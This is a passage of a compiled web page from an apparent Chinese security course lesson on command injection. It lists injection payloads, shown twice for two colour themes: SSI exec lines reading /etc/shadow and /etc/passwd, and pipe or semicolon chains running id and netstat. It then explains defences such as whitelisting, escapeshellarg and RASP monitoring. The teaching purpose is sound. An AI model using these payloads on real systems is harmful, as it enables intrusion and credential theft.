<span class="line"><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">lt;</span><span style="color:#F97583;">!--</span><span style="color:#E1E4E8;">#exec</span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;">20cmd</span><span style="color:#F97583;">=&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">cat</span><span style="color:#F97583;">%</span><span style="color:#79B8FF;">20</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">etc</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">shadow</span><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">--&amp;</span><span style="color:#E1E4E8;">gt;</span></span>
<span class="line"><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">lt;</span><span style="color:#F97583;">!--</span><span style="color:#E1E4E8;">#exec</span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;">20cmd</span><span style="color:#F97583;">=&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id;</span><span style="color:#F97583;">--&amp;</span><span style="color:#E1E4E8;">gt;</span></span>
<span class="line"><span style="color:#F97583;">&amp;</span><span style="color:#E1E4E8;">lt;</span><span style="color:#F97583;">!--</span><span style="color:#E1E4E8;">#exec</span><span style="color:#F97583;">%</span><span style="color:#E1E4E8;">20cmd</span><span style="color:#F97583;">=&amp;</span><span style="color:#E1E4E8;">quot;</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id;</span><span style="color:#F97583;">--&amp;</span><span style="color:#E1E4E8;">gt;</span></span>
<span class="line"><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">index.html</span><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#E1E4E8;">;id;</span></span>
<span class="line"><span style="color:#E1E4E8;">;id</span></span>
<span class="line"><span style="color:#E1E4E8;">;netstat </span><span style="color:#F97583;">-</span><span style="color:#E1E4E8;">a;</span></span>
<span class="line"><span style="color:#E1E4E8;">;</span><span style="color:#B392F0;">system</span><span style="color:#E1E4E8;">(</span><span style="color:#9ECBFF;">&#39;cat%20/etc/passwd&#39;</span><span style="color:#E1E4E8;">)</span></span>
<span class="line"><span style="color:#E1E4E8;">;id;</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">id</span></span>
<span class="line"><span style="color:#F97583;">|/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">||/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#F97583;">|</span><span style="color:#E1E4E8;">id;</span></span>
<span class="line"><span style="color:#F97583;">||/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id;</span></span>
<span class="line"><span style="color:#E1E4E8;">;id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#E1E4E8;">;</span><span style="color:#F97583;">|/</span><span style="color:#E1E4E8;">usr</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">bin</span><span style="color:#F97583;">/</span><span style="color:#E1E4E8;">id</span><span style="color:#F97583;">|</span></span>
<span class="line"><span style="color:#E1E4E8;">......</span></span></code></pre><pre class="shiki github-light vp-code-light"><code><span class="line"><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">lt;</span><span style="color:#D73A49;">!--</span><span style="color:#24292E;">#exec</span><span style="color:#D73A49;">%</span><span style="color:#24292E;">20cmd</span><span style="color:#D73A49;">=&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">cat</span><span style="color:#D73A49;">%</span><span style="color:#005CC5;">20</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">passwd</span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">--&amp;</span><span style="color:#24292E;">gt;</span></span>
<span class="line"><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">lt;</span><span style="color:#D73A49;">!--</span><span style="color:#24292E;">#exec</span><span style="color:#D73A49;">%</span><span style="color:#24292E;">20cmd</span><span style="color:#D73A49;">=&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">cat</span><span style="color:#D73A49;">%</span><span style="color:#005CC5;">20</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">etc</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">shadow</span><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">--&amp;</span><span style="color:#24292E;">gt;</span></span>
<span class="line"><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">lt;</span><span style="color:#D73A49;">!--</span><span style="color:#24292E;">#exec</span><span style="color:#D73A49;">%</span><span style="color:#24292E;">20cmd</span><span style="color:#D73A49;">=&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id;</span><span style="color:#D73A49;">--&amp;</span><span style="color:#24292E;">gt;</span></span>
<span class="line"><span style="color:#D73A49;">&amp;</span><span style="color:#24292E;">lt;</span><span style="color:#D73A49;">!--</span><span style="color:#24292E;">#exec</span><span style="color:#D73A49;">%</span><span style="color:#24292E;">20cmd</span><span style="color:#D73A49;">=&amp;</span><span style="color:#24292E;">quot;</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id;</span><span style="color:#D73A49;">--&amp;</span><span style="color:#24292E;">gt;</span></span>
<span class="line"><span style="color:#D73A49;">/</span><span style="color:#24292E;">index.html</span><span style="color:#D73A49;">|</span><span style="color:#24292E;">id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#24292E;">;id;</span></span>
<span class="line"><span style="color:#24292E;">;id</span></span>
<span class="line"><span style="color:#24292E;">;netstat </span><span style="color:#D73A49;">-</span><span style="color:#24292E;">a;</span></span>
<span class="line"><span style="color:#24292E;">;</span><span style="color:#6F42C1;">system</span><span style="color:#24292E;">(</span><span style="color:#032F62;">&#39;cat%20/etc/passwd&#39;</span><span style="color:#24292E;">)</span></span>
<span class="line"><span style="color:#24292E;">;id;</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">id</span></span>
<span class="line"><span style="color:#D73A49;">|/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">||/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#D73A49;">|</span><span style="color:#24292E;">id;</span></span>
<span class="line"><span style="color:#D73A49;">||/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id;</span></span>
<span class="line"><span style="color:#24292E;">;id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#24292E;">;</span><span style="color:#D73A49;">|/</span><span style="color:#24292E;">usr</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">bin</span><span style="color:#D73A49;">/</span><span style="color:#24292E;">id</span><span style="color:#D73A49;">|</span></span>
<span class="line"><span style="color:#24292E;">......</span></span></code></pre></div><p>Windows 平台以及其他更多的测试用例可参考 <a href="https://github.com/payloadbox/command-injection-payload-list" target="_blank" rel="noreferrer">command-injection-payload-list</a>。</p><h3 id="漏洞防御" tabindex="-1">漏洞防御 <a class="header-anchor" href="#漏洞防御" aria-label="Permalink to &quot;漏洞防御&quot;">​</a></h3><h4 id="_1-代码层面的漏洞规避" tabindex="-1">1.代码层面的漏洞规避 <a class="header-anchor" href="#_1-代码层面的漏洞规避" aria-label="Permalink to &quot;1.代码层面的漏洞规避&quot;">​</a></h4><p>尽量不用系统命令执行函数，这是最简单粗暴的方式，但也是最有效的方式。很多方式其实是可以通过一些语言内置 API 完成，这些攻击者是无法控制 API 去执行其他预料之外的命令，除非 API 存在漏洞。</p><p>如果一定要使用命令执行函数，就尽量不要将外部可控数据作为命令行参数。</p><p>如果要将用户可控数据传递给命令执行函数，那首先推荐白名单方式，然后再是考虑转义过滤，以及数据格式校验。比如靶场题目是输入 IP 地址，那你可以使用正则做 IP 格式的检测，不符合就拒绝请求。总之，尽可能限制可输入参数的范围，比如仅允许数字或者数字字母等方式。</p><blockquote><p>转义过滤：可以使用 escapeshellcmd 函数对整个命令字符串作转义，它会在以下字符之前插入反斜线： &amp;#;\`|*?~&lt;&gt;^()[]{}$, \\x0A 和 \\xFF，但即使如此，攻击者还是可以传入任意数量的参数，此时可以使用 escapeshellarg() 函数对单个参数进行转义。</p></blockquote><h4 id="_2-命令执行监控与阻断" tabindex="-1">2.命令执行监控与阻断 <a class="header-anchor" href="#_2-命令执行监控与阻断" aria-label="Permalink to &quot;2.命令执行监控与阻断&quot;">​</a></h4><p>基于命令执行函数监控，比如 PHP 环境下对 system 函数进行 hook，Java 环境下的 java.lang.Runtime.exec() 函数，当漏洞触发时可告警出来，并支持阻断功能，这就是前面课程多次提到过的 RASP 方案，准确率理论上可达到 100％。</p><p>推荐百度开源的 OpenRASP 产品，下图是其拦截 JSP 命令执行漏洞的事件截图。</p>`,31),h=s("p",null,"图 4 OpenRASP 拦截命令执行",-1),u=s("h3",{id:"总结",tabindex:"-1"},[a("总结 "),s("a",{class:"header-anchor",href:"#总结","aria-label":'Permalink to "总结"'},"​")],-1),g=s("p",null,'本课主要以 PHP 环境下的"命令注入"场景作为演示，介绍了命令注入漏洞的成因，以及常见的利用技巧，特别总结了些常见的限制绕过方法，最后同样讲解漏洞挖掘与防御的主流方式。',-1),A=s("p",null,"命令注入原理和利用相对比较简单，但在真实业务场景中，用户可控变量的传递往往比较复杂，并不一定那么容易发现和构造利用，往往是黑盒扫描与白盒代码审计相结合去发现，业务上线后再结合 RASP 等安全系统去监控和拦截。",-1),m=s("p",null,"WAF 在命令注入检测中有作用相对比较有限，因为有些命令就是简单字母字符串，比如 id。拦截此参数很大概率会连正常请求都阻断点，会影响正常业务功能，所以很多时候都是设法从程序运行环境、系统底层去做检测与拦截。",-1),_=s("hr",null,null,-1),D=s("p",null,[s("a",{href:"https://wj.qq.com/s2/8059116/3881/",target:"_blank",rel:"noreferrer"},"课程评价入口，挑选 5 名小伙伴赠送小礼品～")],-1);function b(v,C,x,k,q,B){const n=e("Image");return t(),c("div",null,[y,p(n,{alt:"图片1.png",src:"https://s0.lgstatic.com/i/image2/M01/0A/A9/Cip5yGASiyeAblmvAAYSmm7bGoE695.png"}),a(),E,p(n,{alt:"图片2.png",src:"https://s0.lgstatic.com/i/image2/M01/0A/AB/CgpVE2ASizuAFANhAAF--IPq7VM659.png"}),a(),i,p(n,{alt:"图片3.png",src:"https://s0.lgstatic.com/i/image/M00/92/BF/CgqCHmASi1CATWHbAARYJuJkPEw289.png"}),a(),d,p(n,{alt:"图片5.png",src:"https://s0.lgstatic.com/i/image/M00/92/B4/Ciqc1GASi7mASyv4AAFgvRQXlzo668.png"}),a(),F,p(n,{alt:"图片4.png",src:"https://s0.lgstatic.com/i/image2/M01/0A/AB/CgpVE2ASi3yACySBAAMVN4nSHBY967.png"}),a(),h,u,g,A,m,_,D])}const S=o(r,[["render",b]]);export{P as __pageData,S as default};
